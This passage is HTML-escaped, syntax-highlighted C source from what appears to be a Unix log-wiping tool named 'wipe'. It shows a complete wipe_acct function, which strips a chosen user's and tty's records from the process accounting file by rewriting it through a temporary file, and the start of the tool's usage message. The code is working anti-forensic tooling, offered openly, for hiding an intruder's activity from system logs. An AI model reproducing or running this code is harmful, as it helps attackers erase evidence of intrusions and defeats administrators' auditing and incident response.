&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Done.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifndef NO_ACCT
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; * ACCOUNT editing.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;wipe_acct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;who&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;		&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fd2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;acct&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;ac&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;		&lt;span class=&#34;n&#34;&gt;ttyn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;passwd&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stat&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;sbuf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;		&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tmpf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Patching %s .... &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ACCT_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;fflush&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 * Open the acct file and temporary file.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ACCT_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;O_RDONLY&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ERROR: Opening %s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ACCT_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 * Grab a unique temporary filename.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;tmpf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;tmpnam&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tmpf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;O_WRONLY&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;O_CREAT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;O_TRUNC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;600&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ERROR: Opening tmp ACCT file&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pwd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getpwnam&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;who&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ERROR: Can&amp;#39;t find user in passwd.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 * Determine tty&amp;#39;s device number
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;strcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ttyn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/dev/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;strcat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ttyn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;stat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ttyn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sbuf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ERROR: Determining tty device number.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ac&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ac&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ac&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ac_uid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pw_uid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ac&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ac_tty&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sbuf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;st_rdev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;nf&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ac&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ac&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;copy_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tmpf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ACCT_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tmpf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ERROR: Unlinking tmp WTMP file.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Done.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;usage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;USAGE: wipe [ u|w|l|a ] ...options...&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
